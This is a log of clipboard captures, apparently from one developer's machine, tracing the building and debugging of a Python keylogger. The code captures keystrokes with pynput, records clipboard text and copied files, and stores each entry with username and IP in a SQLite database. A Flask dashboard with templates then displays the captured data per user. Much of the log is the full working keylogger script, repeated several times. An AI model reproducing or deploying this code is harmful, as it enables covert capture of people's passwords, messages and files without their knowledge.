7/2/2024 9:52,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
7/2/2024 9:53,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
7/2/2024 9:53,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
7/2/2024 9:54,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
7/2/2024 9:56,Toshiba,192.168.100.200,"try:
        if key in modifier_keys:
            return  # Skip logging modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
            log_buffer()  # Log buffer after adding a character
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()  # Log buffer after adding newline
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()  # Log buffer after adding space
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            # Handle non-character keys
            buffer.append(str(key))
            log_buffer()  # Log buffer after adding non-character key"
7/2/2024 9:56,Toshiba,192.168.100.200,"Keystroke logged: s
Keystroke logged: t
Keystroke logged: t
Keystroke logged: e
Keystroke logged: s
Keystroke logged: t
Keystroke logged: i
Keystroke logged: n
Keystroke logged: g
Keystroke logged:
Keystroke logged: t
Keystroke logged: h
Keystroke logged: e
Keystroke logged:
Keystroke logged: c
Keystroke logged: o
Keystroke logged: d
Keystroke logged: e
Keystroke logged:
Keystroke logged: a
Keystroke logged: f
Keystroke logged: a
Keystroke logged: i
Keystroke logged: n
Keystroke logged:"
7/2/2024 9:57,Toshiba,192.168.100.200,"Keystroke logged: s
Keystroke logged: t
Keystroke logged: t
Keystroke logged: e
Keystroke logged: s
Keystroke logged: t
Keystroke logged: i
Keystroke logged: n
Keystroke logged: g
Keystroke logged:
Keystroke logged: t
Keystroke logged: h
Keystroke logged: e
Keystroke logged:
Keystroke logged: c
Keystroke logged: o
Keystroke logged: d
Keystroke logged: e
Keystroke logged:
Keystroke logged: a
Keystroke logged: f
Keystroke logged: a
Keystroke logged: i
Keystroke logged: n
Keystroke logged:"
7/2/2024 9:57,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:58,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:59,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 10:00,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 10:02,Toshiba,192.168.100.200,"@app.route(""/"")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    return render_template(
        ""index.html"",
        unique_users=unique_users,
        user_logs=user_logs,
        clipboard_logs=clipboard_logs,
    )"
7/2/2024 10:03,Toshiba,192.168.100.200,"<!-- index.html -->
<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Clipboard Logs</title>
    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"">
</head>
<body>
    <div class=""container"">
        <h1>Clipboard Logs</h1>
        <ul>
            {% for log in clipboard_logs %}
            <li>{{ log.timestamp }} - {{ log.text }}</li>
            {% endfor %}
        </ul>
    </div>
    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
</body>
</html>
"
7/2/2024 10:07,Toshiba,192.168.100.200,"<p>{{ log.text }}</p>
                <p class=""timestamp text-right"">{{ log.timestamp }}</p>"
7/2/2024 10:08,Toshiba,192.168.100.200,clipclipboard
7/2/2024 10:09,Toshiba,192.168.100.200,"SELECT timestamp, username, ip, text FROM clipboard_logs ORDER BY timestamp DESC"
7/2/2024 10:11,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
7/2/2024 10:12,Toshiba,192.168.100.200,".schema logs
"
7/2/2024 10:16,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
7/2/2024 10:19,Toshiba,192.168.100.200,".database
main: C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\keylog.db; r/w
sqlite> .tables
sqlite> .table 
sqlite> "
7/2/2024 10:21,Toshiba,192.168.100.200,"import sqlite3

DB_FILE = ""path_to_your_database_file.db""  # Replace with your actual database file path

def check_table_existence(table_name):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        # Query SQLite schema to check if table exists
        c.execute(f""SELECT name FROM sqlite_master WHERE type='table' AND name='{table_name}'"")
        
        # Fetch the result
        result = c.fetchone()
        
        conn.close()
        
        # Return True if table exists, False otherwise
        return result is not None
    
    except sqlite3.Error as e:
        print(f""Error checking table existence: {e}"")
        return False

# Example usage
if __name__ == ""__main__"":
    tables_to_check = [""logs"", ""clipboard_logs""]
    
    for table in tables_to_check:
        if check_table_existence(table):
            print(f""Table '{table}' exists in the database."")
        else:
            print(f""Table '{table}' does not exist in the database."")
"
7/2/2024 10:22,Toshiba,192.168.100.200,"python checkingDB.py
Table 'logs' exists in the database.
Table 'clipboard_logs' exists in the database."
7/2/2024 10:26,Toshiba,192.168.100.200,"<!-- index.html -->
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Clipboard Logs</title>
    <link
      rel=""stylesheet""
      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />
  </head>
  <body>
    <div class=""container"">
      <h1>Clipboard Logs</h1>
      <ul>
        {% for log in clipboard_logs %}
        <p>{{ log.text }}</p>
        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
        {% endfor %}
      </ul>
    </div>
    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
  </body>
</html>
"
7/2/2024 10:26,Toshiba,192.168.100.200,"@app.route(""/clip"")
def clipboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    return render_template(
        ""clipboard.html"",
        unique_users=unique_users,
        user_logs=user_logs,
        clipboard_logs=clipboard_logs,
    )"
7/2/2024 10:28,Toshiba,192.168.100.200,"def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text FROM clipboard_logs ORDER BY timestamp DESC""
    )
    rows = c.fetchall()
    conn.close()

    clipboard_logs = {}
    for row in rows:
        timestamp, username, ip, text = row
        user_key = (username, ip)
        if user_key not in clipboard_logs:
            clipboard_logs[user_key] = []
        clipboard_logs[user_key].append({""timestamp"": timestamp, ""text"": text})
    return clipboard_logs"
7/2/2024 10:29,Toshiba,192.168.100.200,"def get_clipboard_logs():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute(""SELECT timestamp, text FROM clipboard_logs ORDER BY timestamp DESC"")
        clipboard_logs = [{""timestamp"": row[0], ""text"": row[1]} for row in c.fetchall()]
        conn.close()
        return clipboard_logs
    except sqlite3.Error as e:
        print(f""Error retrieving clipboard logs: {e}"")
        return []"
7/2/2024 10:30,Toshiba,192.168.100.200,jinja2.exceptions.UndefinedError: 'list object' has no attribute 'items'
7/2/2024 10:33,Toshiba,192.168.100.200,"{% for log in clipboard_logs %}
        <p>{{ log.text }}</p>
        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
        {% endfor %}"
7/2/2024 10:36,Toshiba,192.168.100.200,"File ""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\templates\index.html"", line 47, in top-level template code
{% endfor %} {% endif %} {% if clipboard_logs %} {% for user, logs in
File ""c:\ProgramData\anaconda3\Lib\site-packages\jinja2\utils.py"", line 83, in from_obj
if hasattr(obj, ""jinja_pass_arg""):
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
jinja2.exceptions.UndefinedError: 'list object' has no attribute 'items'"
7/2/2024 10:38,Toshiba,192.168.100.200,"<!-- index.html -->
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Clipboard Logs</title>
    <link
      rel=""stylesheet""
      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />
  </head>
  <body>
    <div class=""container"">
      <h1>Clipboard Logs</h1>
      <ul>
        {% for log in clipboard_logs %}
        <p>{{ log.text }}</p>
        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
        {% endfor %}
      </ul>
    </div>
    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
  </body>
</html>
"
7/2/2024 10:44,Toshiba,192.168.100.200,"conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(""SELECT timestamp, username, ip, text FROM logs ORDER BY timestamp DESC"")
    rows = c.fetchall()
    conn.close()

    user_logs = {}
    for row in rows:
        timestamp, username, ip, text = row
        user_key = (username, ip)
        if user_key not in user_logs:
            user_logs[user_key] = []
        user_logs[user_key].append({""timestamp"": timestamp, ""text"": text})
    return user_logs"
7/2/2024 10:44,Toshiba,192.168.100.200,clipboard_logs
7/2/2024 10:45,Toshiba,192.168.100.200,clipboard.html is working fine and
7/2/2024 10:47,Toshiba,192.168.100.200,"{% else %}
          <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear."
7/2/2024 10:49,Toshiba,192.168.100.200,"{% else %}
          <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear."
7/2/2024 10:49,Toshiba,192.168.100.200,thisis so good
7/2/2024 10:50,Toshiba,192.168.100.200,"<div class=""row row-data"">
              {% for log in logs %}
              <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                <p>{{ log.text }}</p>
                <p class=""timestamp text-left"">{{ log.timestamp }}</p>
              </div>
              {% endfor %}
            </div>
          </section>
          {% endfor %} {% endif %} {% if clipboard_logs %}
            <div class=""row row-data"">
              {% for log in clipboard_logs %}
              <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                <p>{{ log.text }}</p>
                <p class=""timestamp text-left"">{{ log.timestamp }}</p>
              </div>
              {% endfor %}
            </div>
          </section>
          {% else %}
          <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear.
          </div>
          {% endif %}"
7/2/2024 10:52,Toshiba,192.168.100.200,"{% if clipboard_logs %}
        <section>
            <h2>Clipboard Logs</h2>
            <div class=""row row-data"">
                {% for log in clipboard_logs %}
                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                    <p>{{ log.text }}</p>
                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
                </div>
                {% endfor %}
            </div>
        </section>
        {% endif %}

        <!-- Alert if no logs found -->
        {% if not logs and not clipboard_logs %}
        <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear.
        </div>
        {% endif %}
    </div>"
7/2/2024 10:53,Toshiba,192.168.100.200,he uisthe issue seems to be appear here
7/2/2024 10:55,Toshiba,192.168.100.200,he uisthe issue seems to be appear here
7/2/2024 10:58,Toshiba,192.168.100.200,"<div class=""container"">
        <h1>Logs and Clipboard</h1>

        <!-- Display logs -->
        {% if logs %}
        <section>
            <h2>Keystroke Logs</h2>
            <div class=""row row-data"">
                {% for log in logs %}
                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                    <p>{{ log.text }}</p>
                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
                </div>
                {% endfor %}
            </div>
        </section>
        {% endif %}

        <!-- Display clipboard logs -->
        {% if clipboard_logs %}
        <section>
            <h2>Clipboard Logs</h2>
            <div class=""row row-data"">
                {% for log in clipboard_logs %}
                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                    <p>{{ log.text }}</p>
                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
                </div>
                {% endfor %}
            </div>
        </section>
        {% endif %}

        <!-- Alert if no logs found -->
        {% if not logs and not clipboard_logs %}
        <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear.
        </div>
        {% endif %}
    </div>

    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>"
7/2/2024 11:01,Toshiba,192.168.100.200,clipboard both
7/2/2024 11:01,Toshiba,192.168.100.200,clipboard both
7/2/2024 11:04,Toshiba,192.168.100.200,clipboard both
7/2/2024 11:05,Toshiba,192.168.100.200,clipboard_logs
7/2/2024 11:09,Toshiba,192.168.100.200,prin(table
7/2/2024 11:12,Toshiba,192.168.100.200,"try:
                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
                        shutil.copy(file_path, dest_path)  # Copy the file to server
                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""

                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute(
                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
                            (timestamp, username, ip, log_entry),
                        )
                        conn.commit()
                        conn.close()

                        print(f""Clipboard logged: {log_entry}"")"
7/2/2024 11:12,Toshiba,192.168.100.200,"try:
                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
                        shutil.copy(file_path, dest_path)  # Copy the file to server
                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""

                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute(
                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
                            (timestamp, username, ip, log_entry),
                        )
                        conn.commit()
                        conn.close()

                        print(f""Clipboard logged: {log_entry}"")"
7/2/2024 11:13,Toshiba,192.168.100.200,splite3 is keep asking for prompt
7/2/2024 11:15,Toshiba,192.168.100.200,C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\keylog.db
7/2/2024 11:28,Toshiba,192.168.100.200,.shell pwd
7/2/2024 11:29,Toshiba,192.168.100.200,"Error logging clipboard text: no such table: clipboard_logs
Error logging keystroke: no such table: logs"
7/2/2024 11:30,Toshiba,192.168.100.200,"oke: no such table: logs
Error logging keystroke: no such"
7/2/2024 11:30,Toshiba,192.168.100.200,"oke: no such table: logs
Error logging keystroke: no such"
7/2/2024 11:30,Toshiba,192.168.100.200,"So this is working now
"
7/2/2024 11:36,Toshiba,192.168.100.200,"<!-- clipboard.html -->
<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Clipboard Logs</title>
    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"">
</head>
<body>
    <div class=""container"">
        <h1>Clipboard Logs</h1>

        <!-- Display clipboard logs -->
        {% if clipboard_logs %}
        <section>
            <h2>Clipboard Logs</h2>
            <div class=""row row-data"">
                {% for log in clipboard_logs %}
                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                    <p>{{ log.text }}</p>
                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
                </div>
                {% endfor %}
            </div>
        </section>
        {% else %}
        <div class=""alert alert-info text-center"" role=""alert"">
            No clipboard logs found yet. Monitor activity for data to appear.
        </div>
        {% endif %}
    </div>

    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
</body>
</html>"
7/2/2024 11:37,Toshiba,192.168.100.200,"Clipboard Logs
"
7/2/2024 11:39,Toshiba,192.168.100.200,"if isinstance(data, list):  # Check if data is a list of file paths
            for file_path in data:
                if os.path.isfile(file_path):
                    try:
                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
                        shutil.copy(file_path, dest_path)  # Copy the file to server
                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""

                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute(
                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
                            (timestamp, username, ip, log_entry),
                        )
                        conn.commit()
                        conn.close()

                        print(f""Clipboard logged: {log_entry}"")
                    except Exception as e:
                        print(f""Error logging clipboard file: {e}"")
                else:
                    print(f""File not found: {file_path}"")

        else:
            log_entry = f""Clipboard: {data}"""
